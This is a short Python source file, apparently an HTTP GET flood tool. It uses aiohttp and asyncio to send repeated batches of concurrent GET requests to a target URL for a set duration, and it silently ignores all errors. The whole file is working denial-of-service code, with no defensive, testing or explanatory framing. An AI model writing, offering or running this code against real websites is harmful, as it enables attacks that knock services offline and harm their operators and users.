
import aiohttp
import asyncio

async def flood(session, url):
    try:
        async with session.get(url) as response:
            await response.text()
    except:
        pass

async def run_get_flood(url, duration, connections):
    timeout = aiohttp.ClientTimeout(total=5)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        end_time = asyncio.get_event_loop().time() + duration
        while asyncio.get_event_loop().time() < end_time:
            tasks = [flood(session, url) for _ in range(connections)]
            await asyncio.gather(*tasks)
